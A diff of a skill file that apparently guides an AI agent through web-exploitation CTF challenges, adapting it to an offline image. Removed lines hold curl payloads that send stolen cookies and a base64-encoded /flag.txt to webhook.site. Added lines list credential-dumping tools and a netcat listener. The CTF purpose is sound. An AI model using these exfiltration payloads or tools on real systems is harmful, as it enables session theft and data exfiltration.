@@ -2,8 +2,8 @@
 name: ctf-web
 description: Provides web exploitation techniques for CTF challenges. Use when the target is primarily an HTTP application, API, browser client, template engine, identity flow, or smart-contract frontend/backend surface, including XSS, SQLi, SSTI, SSRF, XXE, JWT, auth bypass, file upload, request smuggling, OAuth/OIDC, SAML, prototype pollution, and similar web bugs. Do not use it for native binary memory corruption, reverse engineering of standalone executables, disk or memory forensics, or pure cryptanalysis unless the web flaw is still the main path to the flag.
 license: MIT
-compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
-allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch Skill
+compatibility: Requires filesystem-based agent (Claude Code or similar) with bash and Python 3.
+allowed-tools: Bash Read Write Edit Glob Grep Task Skill
 metadata:
   user-invocable: "false"
   author: Lukasz Jagiello
@@ -16,36 +16,20 @@ Use this skill as a routing and execution guide for web-heavy challenges. Keep t
 ## Prerequisites
 
 **Python packages:** the image already ships `requests` and `httpx`.
-`sqlmap` and `flask-unsign` are **not available** -- write the request in
-Python or use `curl` instead.
 
-**Linux (apt):**
-```bash
-apt install hashcat jq curl
-```
+**CLI tools on PATH:** `nmap`, `sqlmap`, `ffuf` 2.3.0, `smbclient`,
+`flask-unsign` 1.2.1, `curl`, `jq`, and the impacket CLIs
+(`secretsdump.py`, `wmiexec.py`, `psexec.py`, ...) are installed in the
+image. Decode Flask session cookies with `flask-unsign --decode --cookie
+'...'`; drive SQLi with `sqlmap -u ...` when manual UNION/blind extraction
+from [sql-injection.md](sql-injection.md) is too slow.
 
-**macOS (Homebrew):**
-```bash
-brew install hashcat jq curl
-```
-
-**Go tools (all platforms, requires Go):**
-```bash
-go install github.com/ffuf/ffuf/v2@latest
-```
-
-**Manual install:**
-- ysoserial — [GitHub](https://github.com/frohoff/ysoserial), requires Java (Java deserialization payloads)
-- PayloadsAllTheThings — git clone to ctf-web/payloads/PayloadsAllTheThings (auto via install script or lazy clone)
-  ```bash
-  bash scripts/install_ctf_tools.sh pat   # PAT only
-  bash scripts/install_ctf_tools.sh all   # all tools including PAT
-  # manual fallback:
-  git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git ctf-web/payloads/PayloadsAllTheThings
-  ```
-  > PAT is optional and on-demand — not required at load time. The skill works without it (graceful degrade): `pat-reference.md` provides an offline index with exemplar payloads; bulk wordlists require the clone above.
-
-**MCP servers (optional):** Playwright MCP ([microsoft/playwright-mcp](https://github.com/microsoft/playwright-mcp)) for browser-dependent challenges (DOM XSS, admin bot, SPA client secrets) and Burp Suite MCP ([PortSwigger/mcp-server](https://github.com/PortSwigger/mcp-server)) for wire-level work (header-level HTTP/1.1+HTTP/2 control, smuggling, blind SSRF/XXE via Collaborator, proxy-history regex mining) — see [tools-mcp.md](tools-mcp.md). Two things to do before relying on Burp MCP: start Burp *before* the agent, and turn off the two approval gates in Burp's MCP tab or the first tool call blocks on a modal dialog.
+**Not in the image:** `hashcat`, `nuclei`, `ysoserial` (and Java), Burp,
+and Playwright browsers are not available, and there is no internet to
+fetch them. Craft Java/Python deserialization payloads by hand from
+[pat-reference.md](pat-reference.md) -- it is the offline payload index
+(exemplar gadget chains and wordlists inline); do not try to fetch
+PayloadsAllTheThings or wordlist repos.
 
 ## Additional Resources
 
@@ -115,11 +99,10 @@ Glob ctf-web/payloads/PayloadsAllTheThings/**/*.md
 Grep "union select" ctf-web/payloads/PayloadsAllTheThings
 ```
 
-If `ctf-web/payloads/PayloadsAllTheThings/.git` is missing, the agent lazy-clones on demand:
-
-```bash
-[ -d "ctf-web/payloads/PayloadsAllTheThings/.git" ] || git clone --depth 1 https://github.com/swisskyrepo/PayloadsAllTheThings.git ctf-web/payloads/PayloadsAllTheThings
-```
+There is no clone in the offline image and there is no way to make one:
+`ctf-web/payloads/PayloadsAllTheThings` will not exist. When `ls`
+shows nothing, use [pat-reference.md](pat-reference.md) instead -- it
+carries the inline exemplar payloads the PAT recipes assume.
 
 ## Quick Start Commands
 
@@ -189,42 +172,22 @@ For complex scenarios (CSRF tokens, frontend encryption, JSON APIs, Basic Auth, 
 - SSRF -> metadata or internal API -> credential leak -> code execution
 - SQLi or NoSQL injection -> credential bypass -> second-stage template or upload abuse
 
-## Webhook Callbacks (webhook.site)
+## Callback and Out-of-Band Needs (offline image)
 
-For any exploit that needs a callback URL (XSS admin bot, SSRF exfiltration, OAuth redirect abuse, blind injection with out-of-band data), use [webhook.site](https://webhook.site) to instantly receive and inspect incoming requests.
+External callback collectors (public webhook services, Burp Collaborator,
+interactsh) are internet services -- none of them is reachable from the
+task environment. When an exploit wants a callback URL (XSS admin bot,
+SSRF exfiltration, OAuth redirect abuse, blind injection with
+out-of-band data):
 
-**Create a token (get a callback URL):**
-```bash
-curl -X POST https://webhook.site/token
-# Returns {"uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx", ...}
-# Your callback URL: https://webhook.site/<uuid>
-```
-
-**Use the callback URL in your exploit:**
-```bash
-# XSS payload with webhook callback
-curl -X POST https://target.com/api/report \
-  -H "Content-Type: application/json" \
-  -d '{"url": "https://webhook.site/<uuid>/steal?cookie=" + document.cookie}'
-
-# SSRF exfiltration via webhook
-curl "https://target.com/ssrf?url=https://webhook.site/<uuid>/?data=$(cat /flag.txt | base64)"
-
-# OAuth redirect abuse
-curl "https://target.com/auth?redirect=https://webhook.site/<uuid>/token"
-```
-
-**Retrieve the last received request:**
-```bash
-curl "https://webhook.site/token/<uuid>/request/latest/raw" \
-  -H "accept: application/json" \
-  -H "api-key: <uuid>"
-```
-
-**When to use webhook.site vs Burp Collaborator vs interactsh:**
-- **webhook.site** — fastest setup, browser-visible UI, no install needed; best for quick CTF callbacks
-- **Burp Collaborator** — better for blind XSS/SSRF when using Burp Suite as proxy
-- **interactsh** — OOB interaction correlation for complex multi-step exploits
+- **Self-host the listener** on a host you control inside the task
+  network: `python3 -m http.server 9001` or `nc -lvnp 9001`. Probe the
+  network path with one request before building the exploit around it.
+- **No path? Drop the callback.** Convert blind injection to boolean-
+  or time-based extraction ([sql-injection.md](sql-injection.md)); for
+  XSS admin bots, point the bot at a URL on the challenge host itself
+  (an uploaded file, a logging endpoint) instead of an external
+  collector.
 
 ## Deep-Dive Notes
 
